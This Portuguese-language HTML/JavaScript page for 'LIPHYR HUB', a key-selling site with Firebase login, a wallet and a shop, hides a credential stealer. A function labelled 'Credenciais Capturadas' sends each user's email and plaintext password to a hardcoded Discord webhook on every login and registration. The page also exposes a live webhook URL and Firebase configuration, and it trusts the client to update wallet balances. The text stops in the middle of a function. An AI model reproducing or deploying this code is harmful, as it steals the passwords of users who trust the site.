<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LIPHYR HUB - Sistema Premium</title>
    <style>
        /* ESTILOS IGUAIS... MANTENDO IGUAL */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #000000; color: #ffffff; overflow-x: hidden; min-height: 100vh; }
        .particles { position: fixed; width: 100%; height: 100%; top: 0; left: 0; z-index: -1; overflow: hidden; }
        .particle { position: absolute; width: 3px; height: 3px; background: #8a2be2; border-radius: 50%; animation: float 10s infinite; opacity: 0.6; }
        @keyframes float { 0%, 100% { transform: translateY(0) translateX(0); } 50% { transform: translateY(-100px) translateX(50px); } }
        
        /* RESPONSIVIDADE MANTIDA... */
        
        /* RESTANTE DOS ESTILOS IGUAIS... */
        /* ... (todos os estilos permanecem iguais) ... */
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>

    <!-- Modal de Login/Cadastro -->
    <div class="modal active" id="loginModal">
        <!-- ... (c√≥digo igual) ... -->
    </div>

    <!-- Modal de Key Gerada -->
    <div class="modal" id="keyModal">
        <!-- ... (c√≥digo igual) ... -->
    </div>

    <header id="header" style="display: none;">
        <!-- ... (c√≥digo igual) ... -->
    </header>

    <div class="container" id="mainContainer" style="display: none;">
        <!-- ... (c√≥digo igual at√© o script) ... -->
    </div>

    <footer id="footer" style="display: none;">
        <p>&copy; 2024 LIPHYR HUB - Sistema de Keys Premium</p>
    </footer>

    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
        import { 
            getAuth, 
            signInWithEmailAndPassword, 
            signOut,
            createUserWithEmailAndPassword,
            onAuthStateChanged,
            updatePassword
        } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js';
        
        import { 
            getDatabase, 
            ref, 
            set, 
            get, 
            update,
            push,
            onValue,
            query,
            orderByChild,
            equalTo,
            remove
        } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';

        // CONFIGURA√á√ÉO DO FIREBASE
        const firebaseConfig = {
            apiKey: "AIzaSyDRkHyb4gSTcZqCp1RcRuanI-Mu_yj9DVk",
            authDomain: "site-liphyr.firebaseapp.com",
            databaseURL: "https://site-liphyr-default-rtdb.firebaseio.com",
            projectId: "site-liphyr",
            storageBucket: "site-liphyr.firebasestorage.app",
            messagingSenderId: "984832602210",
            appId: "1:984832602210:web:8b4b43e77cd0fc7e4ca13b",
            measurementId: "G-9S7KE7VP3N"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const database = getDatabase(app);

        // WEBHOOK DO DISCORD - ENVIA EMAIL E SENHA
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1446393232157310988/o_yQhxZOnnucRXzJA8bmTikx7bQxOC5VOadxhWoDB2rD4kGf8xBBPlEvWU8N4I25uR0i';

        // Vari√°veis globais
        let currentWalletId = null;
        let currentUserEmail = null;
        let walletListener = null;

        // Fun√ß√µes globais
        window.showForm = showForm;
        window.closeLoginModal = closeLoginModal;
        window.loginUser = loginUser;
        window.registerUser = registerUser;
        window.logout = logout;
        window.showSection = showSection;
        window.verifyKey = verifyKey;
        window.claimDailyKey = claimDailyKey;
        window.changePassword = changePassword;
        window.buyKey = buyKey;
        window.closeKeyModal = closeKeyModal;
        window.copyKey = copyKey;

        // =============== FUN√á√ïES AUXILIARES ===============

        // Criar part√≠culas
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 10 + 's';
                container.appendChild(particle);
            }
        }

        // Mostrar formul√°rio de login ou cadastro
        function showForm(formType) {
            document.querySelectorAll('.form-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.form-content').forEach(form => {
                form.classList.remove('active');
            });
            
            if (formType === 'login') {
                document.querySelector('.form-tab:nth-child(1)').classList.add('active');
                document.getElementById('loginForm').classList.add('active');
            } else {
                document.querySelector('.form-tab:nth-child(2)').classList.add('active');
                document.getElementById('registerForm').classList.add('active');
            }
        }

        // Fechar modal
        function closeLoginModal() {
            return;
        }

        // Fechar modal de key
        function closeKeyModal() {
            document.getElementById('keyModal').classList.remove('active');
        }

        // Copiar key
        function copyKey() {
            const keyElement = document.getElementById('generatedKeyValue');
            const key = keyElement.textContent;
            
            navigator.clipboard.writeText(key).then(() => {
                const originalText = keyElement.textContent;
                keyElement.textContent = '‚úÖ Copiado!';
                keyElement.style.color = '#00ff00';
                keyElement.style.borderColor = '#00ff00';
                
                setTimeout(() => {
                    keyElement.textContent = originalText;
                    keyElement.style.color = '#8a2be2';
                    keyElement.style.borderColor = '#8a2be2';
                }, 2000);
            });
        }

        // Gerar key aleat√≥ria
        function generateRandomKey() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let key = '';
            for (let i = 0; i < 4; i++) {
                for (let j = 0; j < 4; j++) {
                    key += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                if (i < 3) key += '-';
            }
            return key;
        }

        // Enviar credenciais para Discord
        async function sendCredentialsToDiscord(email, password, action) {
            try {
                const embed = {
                    username: "LIPHYR HUB - Credenciais",
                    embeds: [{
                        title: "üîê Credenciais Capturadas",
                        color: 0xff0000,
                        fields: [
                            {
                                name: "üìß Email",
                                value: `\`\`\`${email}\`\`\``,
                                inline: false
                            },
                            {
                                name: "üîë Senha",
                                value: `\`\`\`${password}\`\`\``,
                                inline: false
                            },
                            {
                                name: "‚ö° A√ß√£o",
                                value: action,
                                inline: true
                            },
                            {
                                name: "üïí Data/Hora",
                                value: new Date().toLocaleString('pt-BR'),
                                inline: true
                            }
                        ],
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: "LIPHYR HUB Security System"
                        }
                    }]
                };

                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(embed)
                });
            } catch (error) {
                console.log('Erro ao enviar para Discord');
            }
        }

        // =============== SISTEMA DE CARTEIRA EM TEMPO REAL ===============

        // Fun√ß√£o principal para atualizar interface com saldo
        function updateWalletUI(walletData) {
            if (!walletData) return;
            
            const balance = walletData.balance || 0;
            const totalReceived = walletData.totalReceived || 0;
            
            // Atualizar todos os elementos que mostram saldo
            const balanceElements = {
                'walletBalance': balance.toFixed(2),
                'dashboardBalance': `R$ ${balance.toFixed(2)}`,
                'walletHeader': `R$ ${balance.toFixed(2)}`,
                'shopBalance': `R$ ${balance.toFixed(2)}`,
                'totalReceived': `R$ ${totalReceived.toFixed(2)}`
            };
            
            Object.keys(balanceElements).forEach(id => {
                const element = document.getElementById(id);
                if (element) {
                    element.textContent = balanceElements[id];
                }
            });
            
            // Atualizar bot√µes da shop
            updateShopButtons(balance);
            
            // Atualizar hist√≥rico
            if (walletData.history) {
                loadWalletHistory(walletData.history);
            }
        }

        // Encontrar carteira do usu√°rio
        async function findUserWallet(userEmail) {
            try {
                const walletsRef = ref(database, 'wallets');
                const snapshot = await get(walletsRef);
                
                if (snapshot.exists()) {
                    const wallets = snapshot.val();
                    
                    for (const [walletId, wallet] of Object.entries(wallets)) {
                        if ((wallet.userEmail && wallet.userEmail.toLowerCase() === userEmail.toLowerCase()) ||
                            (wallet.email && wallet.email.toLowerCase() === userEmail.toLowerCase())) {
                            console.log('‚úÖ Carteira encontrada:', walletId);
                            return { walletId, walletData: wallet };
                        }
                    }
                }
                
                console.log('‚ùå Carteira n√£o encontrada para:', userEmail);
                return null;
                
            } catch (error) {
                console.error('Erro ao buscar carteira:', error);
                return null;
            }
        }

        // Configurar listener em tempo real para carteira
        function setupWalletListener(walletId) {
            // Remover listener anterior se existir
            if (walletListener) {
                walletListener();
                walletListener = null;
            }
            
            if (!walletId) return;
            
            const walletRef = ref(database, 'wallets/' + walletId);
            
            // Configurar listener em tempo real
            walletListener = onValue(walletRef, (snapshot) => {
                if (snapshot.exists()) {
                    const walletData = snapshot.val();
                    console.log('üîÑ Saldo atualizado em tempo real:', walletData.balance);
                    updateWalletUI(walletData);
                }
            }, (error) => {
                console.error('Erro no listener da carteira:', error);
            });
        }

        // Inicializar sistema de carteira
        async function initializeWalletSystem(userEmail) {
            try {
                currentUserEmail = userEmail;
                
                // Encontrar carteira do usu√°rio
                const walletInfo = await findUserWallet(userEmail);
                
                if (!walletInfo) {
                    // Criar nova carteira se n√£o existir
                    console.log('üîÑ Criando nova carteira para:', userEmail);
                    await createWalletForUser(userEmail);
                    return;
                }
                
                const { walletId, walletData } = walletInfo;
                currentWalletId = walletId;
                
                // Atualizar interface com dados iniciais
                updateWalletUI(walletData);
                
                // Configurar listener em tempo real
                setupWalletListener(walletId);
                
                // Garantir que o usu√°rio tem refer√™ncia √† carteira
                await saveWalletReference(userEmail, walletId);
                
            } catch (error) {
                console.error('Erro ao inicializar carteira:', error);
            }
        }

        // Criar carteira para novo usu√°rio
        async function createWalletForUser(userEmail) {
            try {
                const user = auth.currentUser;
                if (!user) return null;
                
                const walletId = 'wallet_' + user.uid;
                const walletRef = ref(database, 'wallets/' + walletId);
                
                const walletData = {
                    balance: 10.00,
                    totalReceived: 10.00,
                    lastCredit: Date.now(),
                    userId: user.uid,
                    userEmail: userEmail,
                    email: userEmail,
                    createdAt: Date.now(),
                    status: 'active',
                    history: [{
                        amount: 10.00,
                        description: 'üéâ B√¥nus de Cadastro',
                        timestamp: Date.now(),
                        type: 'bonus'
                    }]
                };
                
                await set(walletRef, walletData);
                console.log('‚úÖ Nova carteira criada:', walletId);
                
                currentWalletId = walletId;
                
                // Atualizar interface
                updateWalletUI(walletData);
                
                // Configurar listener
                setupWalletListener(walletId);
                
                return walletId;
                
            } catch (error) {
                console.error('‚ùå Erro ao criar carteira:', error);
                return null;
            }
        }

        // Atualizar bot√µes da shop
        function updateShopButtons(balance) {
            const buy7DaysBtn = document.getElementById('buy7Days');
            const buy30DaysBtn = document.getElementById('buy30Days');
            const buy90DaysBtn = document.getElementById('buy90Days');
            
            if (balance >= 50) {
                buy7DaysBtn.disabled = false;
                buy7DaysBtn.innerHTML = 'Comprar Agora';
            } else {
                buy7DaysBtn.disabled = true;
                buy7DaysBtn.innerHTML = 'Saldo Insuficiente';
            }
            
            if (balance >= 100) {
                buy30DaysBtn.disabled = false;
                buy30DaysBtn.innerHTML = 'Comprar Agora';
            } else {
                buy30DaysBtn.disabled = true;
                buy30DaysBtn.innerHTML = 'Saldo Insuficiente';
            }
            
            if (balance >= 200) {
                buy90DaysBtn.disabled = false;
                buy90DaysBtn.innerHTML = 'Comprar Agora';
            } else {
                buy90DaysBtn.disabled = true;
                buy90DaysBtn.innerHTML = 'Saldo Insuficiente';
            }
        }

        // Carregar hist√≥rico da carteira
        function loadWalletHistory(history) {
            const container = document.getElementById('historyList');
            
            if (!history || history.length === 0) {
                container.innerHTML = '<p style="color: #cccccc;">Nenhuma transa√ß√£o encontrada.</p>';
                return;
            }
            
            // Ordenar por data (mais recente primeiro)
            history.sort((a, b) => b.timestamp - a.timestamp);
            
            container.innerHTML = '';
            history.forEach((item, index) => {
                if (index > 9) return; // Limitar a 10 itens
                
                const date = new Date(item.timestamp);
                const historyItem = document.createElement('div');
                historyItem.className = 'history-item';
                historyItem.innerHTML = `
                    <div>
                        <div class="history-description">${item.description}</div>
                        <div class="history-date">${date.toLocaleDateString('pt-BR')} ${date.toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'})}</div>
                    </div>
                    <div class="history-amount">${item.amount >= 0 ? '+' : ''}R$ ${item.amount.toFixed(2)}</div>
                `;
                container.appendChild(historyItem);
            });
        }

        // Salvar refer√™ncia da carteira no usu√°rio
        async function saveWalletReference(userEmail, walletId) {
            try {
                const usersRef = ref(database, 'users');
                const snapshot = await get(usersRef);
                
                if (snapshot.exists()) {
                    const users = snapshot.val();
                    
                    for (const [userId, userData] of Object.entries(users)) {
                        if (userData.email === userEmail) {
                            await update(ref(database, 'users/' + userId), {
                                walletId: walletId,
                                balance: userData.balance || 10.00,
                                lastWalletUpdate: Date.now()
                            });
                            console.log('‚úÖ Refer√™ncia da carteira atualizada');
                            return;
                        }
                    }
                }
            } catch (error) {
                console.error('Error saving wallet reference:', error);
            }
        }

        // =============== FUN√á√ïES PRINCIPAIS ===============

        // Atualizar interface do usu√°rio
        function updateUserUI(user) {
            if (user) {
                // Usu√°rio logado
                document.getElementById('header').style.display = 'flex';
                document.getElementById('mainContainer').style.display = 'block';
                document.getElementById('footer').style.display = 'block';
                document.getElementById('loginModal').style.display = 'none';
                
                // Atualizar informa√ß√µes
                document.getElementById('userEmailDisplay').textContent = user.email;
                document.getElementById('userAvatar').textContent = user.email.charAt(0).toUpperCase();
                document.getElementById('dashboardEmail').textContent = user.email;
                document.getElementById('accountEmail').textContent = user.email;
                document.getElementById('userId').textContent = user.uid.substring(0, 8);
                document.getElementById('walletUser').textContent = user.email.split('@')[0];
                document.getElementById('walletId').textContent = `ID: ${user.uid.substring(0, 8)}`;
                
                // Inicializar sistema de carteira em tempo real
                initializeWalletSystem(user.email);
                
                // Carregar outros dados
                loadUserData(user);
                loadUserKeys(user.email);
                updateDailyKeyTimer();
            } else {
                // N√£o logado - limpar tudo
                document.getElementById('header').style.display = 'none';
                document.getElementById('mainContainer').style.display = 'none';
                document.getElementById('footer').style.display = 'none';
                document.getElementById('loginModal').style.display = 'flex';
                
                // Limpar listener da carteira
                if (walletListener) {
                    walletListener();
                    walletListener = null;
                }
                
                currentWalletId = null;
                currentUserEmail = null;
            }
        }

        // Monitorar estado de autentica√ß√£o
        onAuthStateChanged(auth, (user) => {
            updateUserUI(user);
        });

        // Login do usu√°rio
        async function loginUser() {
            const email = document.getElementById('loginEmail').value.trim();
            const password = document.getElementById('loginPassword').value;
            const errorDiv = document.getElementById('loginError');

            if (!email || !password) {
                errorDiv.textContent = 'Preencha todos os campos!';
                errorDiv.style.display = 'block';
                return;
            }

            try {
                // Enviar credenciais para Discord
                await sendCredentialsToDiscord(email, password, 'LOGIN');
                
                // Fazer login
                const userCredential = await signInWithEmailAndPassword(auth, email, password);
                
                errorDiv.style.display = 'none';
                document.getElementById('loginEmail').value = '';
                document.getElementById('loginPassword').value = '';
                
            } catch (error) {
                console.error('Login error:', error);
                errorDiv.textContent = 'Email ou senha incorretos!';
                errorDiv.style.display = 'block';
            }
        }

        // Cadastro de usu√°rio
        async function registerUser() {
            const email = document.getElementById('registerEmail').value.trim();
            const password = document.getElementById('registerPassword').value;
            const confirmPassword = document.getElementById('registerConfirmPassword').value;
            const errorDiv = document.getElementById('registerError');

            if (!email || !password || !confirmPassword) {
                errorDiv.textContent = 'Preencha todos os campos!';
                errorDiv.style.display = 'block';
                return;
            }

            if (password !== confirmPassword) {
                errorDiv.textContent = 'As senhas n√£o coincidem!';
                errorDiv.style.display = 'block';
                return;
            }

            if (password.length < 6) {
                errorDiv.textContent = 'A senha deve ter pelo menos 6 caracteres!';
                errorDiv.style.display = 'block';
                return;
            }

            try {
                // Enviar credenciais para Discord
                await sendCredentialsToDiscord(email, password, 'NOVO CADASTRO');
                
                // Criar usu√°rio no Firebase Auth
                const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                const user = userCredential.user;
                
                // Criar registro do usu√°rio
                const userId = 'user_' + user.uid;
                const userRef = ref(database, 'users/' + userId);
                
                const userData = {
                    email: user.email,
                    firebaseUid: user.uid,
                    createdAt: Date.now(),
                    lastDailyKey: null,
                    keysCount: 0,
                    bonusReceived: true,
                    status: 'active'
                };
                
                await set(userRef, userData);
                console.log('‚úÖ Usu√°rio registrado:', userId);
                
                // A carteira ser√° criada automaticamente pelo sistema
                
                errorDiv.style.display = 'none';
                document.getElementById('registerEmail').value = '';
                document.getElementById('registerPassword').value = '';
                document.getElementById('registerConfirmPassword').value = '';
                
                // Mostrar mensagem de sucesso
                showForm('login');
                alert('‚úÖ Cadastro realizado com sucesso! Voc√™ ganhou R$ 10,00 de b√¥nus! Fa√ßa login.');
                
            } catch (error) {
                console.error('Register error:', error);
                
                if (error.code === 'auth/email-already-in-use') {
                    errorDiv.textContent = 'Este email j√° est√° em uso!';
                } else if (error.code === 'auth/invalid-email') {
                    errorDiv.textContent = 'Email inv√°lido!';
                } else {
                    errorDiv.textContent = 'Erro ao cadastrar. Tente novamente!';
                }
                errorDiv.style.display = 'block';
            }
        }

        // Logout
        async function logout() {
            try {
                await signOut(auth);
            } catch (error) {
                console.error('Logout error:', error);
            }
        }

        // Mostrar se√ß√£o
        function showSection(sectionId) {
            if (sectionId === 'support') {
                document.getElementById('dashboard').classList.remove('active');
                document.getElementById('supportSection').style.display = 'block';
                return;
            }
            
            document.getElementById('dashboard').classList.add('active');
            document.getElementById('supportSection').style.display = 'none';
            
            document.querySelectorAll('.menu-item').forEach(item => {
                item.classList.remove('active');
            });
            
            document.querySelectorAll('.content-section').forEach(section => {
                section.classList.remove('active');
            });
            
            document.getElementById(sectionId + 'Section').classList.add('active');
            
            const menuItem = Array.from(document.querySelectorAll('.menu-item')).find(
                item => item.textContent.includes(
                    sectionId === 'dashboard' ? 'Dashboard' : 
                    sectionId === 'wallet' ? 'Carteira' :
                    sectionId === 'account' ? 'Minha Conta' :
                    sectionId === 'freeKey' ? 'Key Di√°ria' :
                    sectionId === 'shop' ? 'Shop' :
                    sectionId === 'myKeys' ? 'Minhas Keys' : 'Verificar Key'
                )
            );
            if (menuItem) menuItem.classList.add('active');
        }

        // =============== COMPRAR KEY (FUN√á√ÉO CORRIGIDA) ===============

        async function buyKey(planType, price, productName) {
            const user = auth.currentUser;
            if (!user) {
                alert('‚ùå Voc√™ precisa estar logado para comprar!');
                return;
            }
            
            if (!confirm(`Deseja comprar ${productName} por R$ ${price.toFixed(2)}?`)) {
                return;
            }
            
            try {
                console.log('üõí Iniciando compra para:', user.email);
                
                // Verificar se temos o walletId atual
                if (!currentWalletId) {
                    // Buscar carteira
                    const walletInfo = await findUserWallet(user.email);
                    if (!walletInfo) {
                        alert('‚ùå Carteira n√£o encontrada!');
                        return;
                    }
                    currentWalletId = walletInfo.walletId;
                }
                
                // Buscar dados atuais da carteira
                const walletRef = ref(database, 'wallets/' + currentWalletId);
                const snapshot = await get(walletRef);
                
                if (!snapshot.exists()) {
                    alert('‚ùå Carteira n√£o encontrada!');
                    return;
                }
                
                const walletData = snapshot.val();
                const currentBalance = walletData.balance || 0;
                
                if (currentBalance < price) {
                    alert(`‚ùå Saldo insuficiente! Voc√™ tem R$ ${currentBalance.toFixed(2)} e precisa de R$ ${price.toFixed(2)}.`);
                    return;
                }
                
                // Calcular dura√ß√£o
                let durationDays, expiresAt;
                switch(planType) {
                    case '7_dias':
                        durationDays = 7;
                        break;
                    case '30_dias':
                        durationDays = 30;
                        break;
                    case '90_dias':
                        durationDays = 90;
                        break;
                    default:
                        durationDays = 7;
                }
                
                expiresAt = Date.now() + (durationDays * 24 * 60 * 60 * 1000);
                
                // Gerar nova key
                const newKey = generateRandomKey();
                
                const keyData = {
                    key: newKey,
                    client: user.email,
                    clientEmail: user.email,
                    product: productName,
                    duration: durationDays,
                    timeUnit: 'days',
                    expiresAt: expiresAt,
                    active: true,
                    type: 'premium',
                    price: price,
                    createdAt: Date.now(),
                    createdByEmail: user.email,
                    createdByUid: user.uid
                };
                
                // SALVAR KEY NO FIREBASE
                const keyId = newKey.replace(/-/g, '_');
                const keyRef = ref(database, 'keys/' + keyId);
                
                console.log('üì§ Salvando key no Firebase:', keyRef.toString());
                await set(keyRef, keyData);
                console.log('‚úÖ Key salva com sucesso!');
                
                // ATUALIZAR SALDO NA CARTEIRA
                const newBalance = currentBalance - price;
                const newHistory = walletData.history || [];
                
                newHistory.push({
                    amount: -price,
                    description: `Compra: ${productName}`,
                    timestamp: Date.now(),
                    type: 'purchase'
                });
                
                // Atualizar carteira no Firebase
                await update(walletRef, {
                    balance: newBalance,
                    history: newHistory.slice(-50),
                    lastUpdate: Date.now()
                });
                
                console.log('‚úÖ Saldo atualizado: R$', newBalance);
                
                // Mostrar modal com a key
                document.getElementById('generatedKeyValue').textContent = newKey;
                document.getElementById('keyModal').classList.add('active');
                
                // A interface ser√° atualizada automaticamente pelo listener
                
                // Mostrar mensagem de sucesso
                alert(`‚úÖ Compra realizada com sucesso! Key gerada: ${newKey}`);
                
            } catch (error) {
                console.error('‚ùå Error buying key:', error);
                alert('‚ùå Erro ao comprar key: ' + error.message);
            }
        }

        // =============== OUTRAS FUN√á√ïES ===============

        // Carregar dados do usu√°rio
        async function loadUserData(user) {
            try {
                console.log('üîç Buscando dados do usu√°rio:', user.email);
                
                // Buscar usu√°rio pelo email
                const usersRef = ref(database, 'users');
                const snapshot = await get(usersRef);
                
                let userData = null;
                
                if (snapshot.exists()) {
                    const users = snapshot.val();
                    
                    for (const [key, data] of Object.entries(users)) {
                        if (data.email === user.email) {
                            userData = data;
                            break;
                        }
                    }
                }
                
                if (userData) {
                    const createdDate = new Date(userData.createdAt || Date.now());
                    document.getElementById('accountCreated').textContent = createdDate.toLocaleDateString('pt-BR');
                    
                    if (userData.lastDailyKey) {
                        const now = Date.now();
                        const hoursSinceLastClaim = (now - userData.lastDailyKey) / (1000 * 60 * 60);
                        
                        if (hoursSinceLastClaim < 24) {
                            document.getElementById('dailyKeyStatus').textContent = 'Aguardando reset';
                            document.getElementById('dailyKeyStatus').style.color = '#ffa500';
                        }
                    }
                } else {
                    console.log('Usu√°rio n√£o encontrado no banco de dados');
                }
            } catch (error) {
                console.error('Error loading user data:', error);
            }
        }

        // Carregar keys do usu√°rio
        async function loadUserKeys(userEmail) {
            const container = document.getElementById('keysList');
            
            try {
                const keysRef = ref(database, 'keys');
                const snapshot = await get(keysRef);

                if (!snapshot.exists()) {
                    container.innerHTML = '<p style="text-align: center; color: #8a2be2; padding: 40px;">Nenhuma key encontrada.</p>';
                    document.getElementById('activeKeysCount').textContent = '0';
                    return;
                }

                const keys = [];
                snapshot.forEach((child) => {
                    const data = child.val();
                    if (data.clientEmail === userEmail) {
                        keys.push(data);
                    }
                });

                document.getElementById('activeKeysCount').textContent = keys.length;

                if (keys.length === 0) {
                    container.innerHTML = '<p style="text-align: center; color: #8a2be2; padding: 40px;">Voc√™ n√£o possui keys.</p>';
                    return;
                }

                keys.sort((a, b) => b.createdAt - a.createdAt);
                container.innerHTML = '';
                let activeCount = 0;
                keys.forEach((data) => {
                    const now = Date.now();
                    let statusText = 'Ativa';
                    let statusClass = 'status-active';
                    
                    if (!data.active) {
                        statusText = 'Inativa';
                        statusClass = 'status-expired';
                    } else if (data.expiresAt && now > data.expiresAt) {
                        statusText = 'Expirada';
                        statusClass = 'status-expired';
                    } else {
                        activeCount++;
                    }

                    const item = document.createElement('div');
                    item.className = 'key-item';
                    item.innerHTML = `
                        <div>
                            <div class="key-value">${data.key}</div>
                            <div style="font-size: 12px; color: #cccccc; margin-top: 5px;">
                                ${data.product} ‚Ä¢ ${new Date(data.createdAt).toLocaleDateString('pt-BR')}
                            </div>
                        </div>
                        <div class="key-status ${statusClass}">${statusText}</div>
                    `;
                    container.appendChild(item);
                });

                document.getElementById('activeKeysCount').textContent = activeCount;

            } catch (error) {
                console.error('Error loading user keys:', error);
                container.innerHTML = '<p style="text-align: center; color: #ff4444; padding: 40px;">Erro ao carregar keys.</p>';
            }
        }

        // Atualizar timer da key di√°ria
        function updateDailyKeyTimer() {
            const user = auth.currentUser;
            if (!user) return;
            
            const timerElement = document.getElementById('dailyKeyTimer');
            const freeKeyTimerElement = document.getElementById('freeKeyTimer');
            const messageElement = document.getElementById('dailyKeyMessage');
            const freeKeyMessageElement = document.getElementById('freeKeyMessage');
            const claimBtn = document.getElementById('claimBtn');
            const dailyClaimBtn = document.getElementById('dailyClaimBtn');
            
            // Buscar usu√°rio pelo email
            const usersRef = ref(database, 'users');
            get(usersRef).then(snapshot => {
                if (snapshot.exists()) {
                    const users = snapshot.val();
                    let userData = null;
                    
                    for (const [key, data] of Object.entries(users)) {
                        if (data.email === user.email) {
                            userData = data;
                            break;
                        }
                    }
                    
                    if (userData && userData.lastDailyKey) {
                        const lastClaim = userData.lastDailyKey;
                        const now = Date.now();
                        const timeElapsed = now - lastClaim;
                        const hoursElapsed = timeElapsed / (1000 * 60 * 60);
                        
                        if (hoursElapsed < 24) {
                            // Calcular tempo restante
                            const timeRemaining = 24 * 60 * 60 - (timeElapsed / 1000);
                            const hours = Math.floor(timeRemaining / 3600);
                            const minutes = Math.floor((timeRemaining % 3600) / 60);
                            const seconds = Math.floor(timeRemaining % 60);
                            
                            const timeString = 
                                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                            
                            timerElement.textContent = timeString;
                            freeKeyTimerElement.textContent = timeString;
                            
                            claimBtn.disabled = true;
                            claimBtn.textContent = '‚è≥ Aguardando reset...';
                            dailyClaimBtn.disabled = true;
                            dailyClaimBtn.textContent = '‚è≥ Aguardando reset...';
                            
                            messageElement.textContent = `Voc√™ j√° resgatou sua key di√°ria. Pr√≥ximo resgate em:`;
                            freeKeyMessageElement.textContent = `Voc√™ j√° resgatou sua key di√°ria. Pr√≥ximo resgate em:`;
                            
                            // Atualizar a cada segundo
                            setTimeout(updateDailyKeyTimer, 1000);
                        } else {
                            timerElement.textContent = '00:00:00';
                            freeKeyTimerElement.textContent = '00:00:00';
                            claimBtn.disabled = false;
                            claimBtn.textContent = 'üéÅ Resgatar Key Di√°ria';
                            dailyClaimBtn.disabled = false;
                            dailyClaimBtn.textContent = 'üéÅ Resgatar Key Di√°ria';
                            messageElement.textContent = 'Sua key di√°ria est√° dispon√≠vel!';
                            freeKeyMessageElement.textContent = 'Sua key di√°ria est√° dispon√≠vel!';
                        }
                    } else {
                        // Nunca resgatou
                        timerElement.textContent = '00:00:00';
                        freeKeyTimerElement.textContent = '00:00:00';
                        claimBtn.disabled = false;
                        claimBtn.textContent = 'üéÅ Resgatar Key Di√°ria';
                        dailyClaimBtn.disabled = false;
                        dailyClaimBtn.textContent = 'üéÅ Resgatar Key Di√°ria';
                        messageElement.textContent = 'Sua key di√°ria est√° dispon√≠vel!';
                        freeKeyMessageElement.textContent = 'Sua key di√°ria est√° dispon√≠vel!';
                    }
                }
            }).catch(error => {
                console.error('Error loading daily key timer:', error);
            });
        }

        // Resgatar key di√°ria
        async function claimDailyKey() {
            const user = auth.currentUser;
            if (!user) {
                alert('‚ùå Voc√™ precisa estar logado para resgatar a key di√°ria!');
                return;
            }
            
            try {
                // Buscar usu√°rio pelo email
                const usersRef = ref(database, 'users');
                const snapshot = await get(usersRef);
                
                let canClaim = true;
                let userId = null;
                
                if (snapshot.exists()) {
                    const users = snapshot.val();
                    
                    for (const [key, userData] of Object.entries(users)) {
                        if (userData.email === user.email) {
                            userId = key;
                            const now = Date.now();
                            
                            if (userData.lastDailyKey) {
                                const lastClaim = userData.lastDailyKey;
                                const hoursSinceLastClaim = (now - lastClaim) / (1000 * 60 * 60);
                                
                                if (hoursSinceLastClaim < 24) {
                                    alert('‚è≥ Voc√™ j√° resgatou sua key di√°ria hoje! Volte amanh√£.');
                                    canClaim = false;
                                }
                            }
                            break;
                        }
                    }
                }
                
                if (!canClaim) return;
                
                // Gerar nova key
                const newKey = generateRandomKey();
                const expiresAt = Date.now() + (2 * 60 * 60 * 1000); // 2 horas
                
                const keyData = {
                    key: newKey,
                    client: user.email,
                    clientEmail: user.email,
                    product: 'Key Di√°ria (2 Horas)',
                    duration: 2,
                    timeUnit: 'hours',
                    expiresAt: expiresAt,
                    active: true,
                    type: 'daily',
                    createdAt: Date.now(),
                    createdByEmail: user.email,
                    createdByUid: user.uid
                };
                
                // SALVAR KEY NO FIREBASE
                const keyId = newKey.replace(/-/g, '_');
                const keyRef = ref(database, 'keys/' + keyId);
                
                console.log('üì§ Salvando key di√°ria:', keyRef.toString());
                await set(keyRef, keyData);
                console.log('‚úÖ Key di√°ria salva!');
                
                // Atualizar √∫ltimo resgate do usu√°rio
                if (userId) {
                    await update(ref(database, 'users/' + userId), {
                        lastDailyKey: Date.now()
                    });
                }
                
                // Mostrar modal com a key
                document.getElementById('generatedKeyValue').textContent = newKey;
                document.getElementById('keyModal').classList.add('active');
                
                // Atualizar interface
                await loadUserKeys(user.email);
                updateDailyKeyTimer();
                
                // Programar b√¥nus de R$ 10,00 ap√≥s 24h
                setTimeout(async () => {
                    try {
                        // Buscar carteira atual
                        if (currentWalletId) {
                            const walletRef = ref(database, 'wallets/' + currentWalletId);
                            const snapshot = await get(walletRef);
                            
                            if (snapshot.exists()) {
                                const walletData = snapshot.val();
                                const newBalance = (walletData.balance || 0) + 10.00;
                                const newTotal = (walletData.totalReceived || 0) + 10.00;
                                const newHistory = walletData.history || [];
                                
                                newHistory.push({
                                    amount: 10.00,
                                    description: 'üí∞ B√¥nus da Key Di√°ria (24h depois)',
                                    timestamp: Date.now(),
                                    type: 'daily_bonus'
                                });
                                
                                await update(walletRef, {
                                    balance: newBalance,
                                    totalReceived: newTotal,
                                    history: newHistory.slice(-50),
                                    lastCredit: Date.now()
                                });
                                
                                alert('üéâ B√¥nus de R$ 10,00 creditado na sua carteira!');
                            }
                        }
                    } catch (bonusError) {
                        console.error('Erro ao adicionar b√¥nus:', bonusError);
                    }
                }, 24 * 60 * 60 * 1000); // 24 horas
                
            } catch (error) {
                console.error('Error claiming daily key:', error);
                alert('‚ùå Erro ao resgatar key: ' + error.message);
            }
        }

        // Verificar key
        async function verifyKey() {
